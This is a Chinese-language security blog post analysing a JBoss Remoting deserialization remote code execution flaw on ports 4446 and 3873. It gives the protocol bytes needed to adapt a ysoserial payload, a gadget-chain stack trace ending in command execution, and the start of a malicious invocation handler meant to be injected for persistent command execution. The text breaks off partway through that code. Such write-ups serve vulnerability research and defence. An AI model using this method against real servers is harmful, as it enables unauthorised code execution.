**作者：Y4er**  
**原文链接：**
看到推上发了jboss的0day rce，分析一下。
## 前言
这个洞是在国外Alligator Conference 2019会议上的一个议题，ppt在这里
议题中讲到了jboss的4446端口反序列化rce，和一条jndi注入的gadget。
## 反序列化rce
jboss默认会开几个端口
端口 | 状态 | 目的  
---|---|---  
1098 | 启用 | RMI 命名服务  
3528 | 已禁用 | IANA 分配的 IIOP 端口  
4444 | 启用 | RMI JRMP 调用程序  
4445 | 启用 | RMI 池调用程序  
4446 | 启用 | 远程服务器连接器  
4447 | 启用 | 远程服务器连接器  
4457 | 启用 | 远程服务器连接器  
4712 | 启用 | JBossTS 恢复管理器  
4713 | 启用 | JBossTS 事务状态管理器  
4714 | 启用 | JBossTS 的进程 ID  
8080 | 启用 | HTTP 连接器  
8083 | 启用 | RMI 类加载迷你 Web 服务器  
8443 | 启用 | JBossWS HTTPS 连接器套接字  
其中4445端口有一个历史RCE cve-2016-3690，是PooledInvokerServlet反序列化。
这次问题出在4446，这是个Remoting3端口，[官网介绍看这里](https://jbossremoting.jboss.org/remoting-3)，看了看remoting3的文档没写，可以先看2的文档。
这是一个架构图
直接向4446发送一些数据
明显的aced0005，但是没有其他的东西了，可能是对数据的解析进行了特殊处理，我们使用api来远程调用一下。
创建一个maven项目，导入jboss remoting2的包，或者从
https://jbossremoting.jboss.org/downloads.html 直接下载jar包也行。
maven配置参考520师傅的
        org.jboss.remoting
        jboss-remoting
        2.5.4.SP5
        org.jboss.logging
        jboss-logging
        3.3.0.Final
        org.jboss
        jboss-common-core
        2.5.0.Final
                org.jboss.logging
                jboss-logging-spi
        concurrent
        concurrent
        1.3.4
客户端先发一个0xaced0005，服务端回复一个0xaced0005，然后客户端发0x77011679…等。其中0x77011679分别表示
    final static byte TC_BLOCKDATA =    (byte)0x77;
    final static byte SC_WRITE_METHOD = 0x01;
    0x16 Protocol version 22
    final static byte TC_RESET =        (byte)0x79;
后面的东西就是payload了，所以我们只需要替换yso生成的payload的前四个字节。
4446和3873端?均可利?。
## 调试跟一下
在`org.jboss.remoting.transport.socket.ServerThread#processInvocation`中处理了0x16，读出来协议版本为22
在`org.jboss.remoting.transport.socket.ServerThread#versionedRead`中会调用`this.unmarshaller.read()`
在read中调用java类型的原生反序列化`org.jboss.remoting.serialization.impl.java.JavaSerializationManager#receiveObject`
除了java以外还有别的
最后就进入了readObject
完整的堆栈
    exec:348, Runtime (java.lang)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    transform:125, InvokerTransformer (org.apache.commons.collections.functors)
    transform:122, ChainedTransformer (org.apache.commons.collections.functors)
    get:151, LazyMap (org.apache.commons.collections.map)
    getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
    toString:131, TiedMapEntry (org.apache.commons.collections.keyvalue)
    readObject:86, BadAttributeValueExpException (javax.management)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1185, ObjectStreamClass (java.io)
    readSerialData:2319, ObjectInputStream (java.io)
    readOrdinaryObject:2210, ObjectInputStream (java.io)
    readObject0:1690, ObjectInputStream (java.io)
    readObject:508, ObjectInputStream (java.io)
    readObject:466, ObjectInputStream (java.io)
    receiveObjectVersion2_2:238, JavaSerializationManager (org.jboss.remoting.serialization.impl.java)
    receiveObject:138, JavaSerializationManager (org.jboss.remoting.serialization.impl.java)
    read:123, SerializableUnMarshaller (org.jboss.remoting.marshal.serializable)
    versionedRead:900, ServerThread (org.jboss.remoting.transport.socket)
    completeInvocation:754, ServerThread (org.jboss.remoting.transport.socket)
    processInvocation:744, ServerThread (org.jboss.remoting.transport.socket)
    dorun:548, ServerThread (org.jboss.remoting.transport.socket)
    run:234, ServerThread (org.jboss.remoting.transport.socket)
## rpc调用
研究了一下jboss的remoting，可以写一个类继承自ServerInvocationHandler接口，通过classloader定义到jvm中，然后client查询即可。
关于jboss remoting开发的可以直接看官方的sample，从[这里下载](http://www.jboss.org/file-access/default/members/jbossremoting/downloads/jboss-remoting-2_5_4_SP5.zip)
注册ServerInvocationHandler可以调用`org.jboss.remoting.ServerInvoker#addInvocationHandler`函数，我们需要在线程中找到ServerInvoker的值反射获取以此来动态添加handler。
调试来看在当前线程中就有handler所在的hashmap，所以我们只需要把我们的EvilHandler put进去就行了。
其中ASD就是我的handler
这里直接贴代码，首先需要一个JbossInvocationHandler来执行命令。
    package ysoserial.payloads.templates;
    import org.jboss.remoting.InvocationRequest;
    import org.jboss.remoting.ServerInvocationHandler;
    import org.jboss.remoting.ServerInvoker;
    import org.jboss.remoting.callback.InvokerCallbackHandler;
    import javax.management.MBeanServer;
    public class JbossInvocationHandler implements ServerInvocationHandler, Runnable {
        @Override
        public void run() {
        }
        @Override
        public void setMBeanServer(MBeanServer mBeanServer) {